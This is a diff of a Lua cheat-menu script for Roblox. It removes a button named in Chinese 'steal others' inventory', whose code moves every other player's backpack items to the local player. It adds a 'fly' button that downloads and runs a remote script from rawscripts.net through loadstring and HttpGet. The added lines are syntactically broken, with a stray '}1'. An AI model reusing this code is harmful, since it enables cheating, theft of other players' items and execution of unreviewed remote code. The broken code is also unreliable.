@@ -70,18 +70,11 @@ local Tab = Window:MakeTab({
 })
 
 Tab:AddButton({
-    Name = "偷别人物品栏",
+    Name = "飞行",
     Callback = function()
-          --Copy And Paste:
-    for i,v in pairs (game.Players:GetChildren()) do
-    wait()
-    for i,b in pairs (v.Backpack:GetChildren()) do
-    b.Parent = game.Players.LocalPlayer.Backpack
+loadstring(game:HttpGet("https://rawscripts.net/raw/FREE-ADMIN-FLY-GUI-30799"))()
     end
-    end
-    end
-})
-
+}1
 Tab:AddButton({
 	Name = "伪名说话",
 	Callback = function()
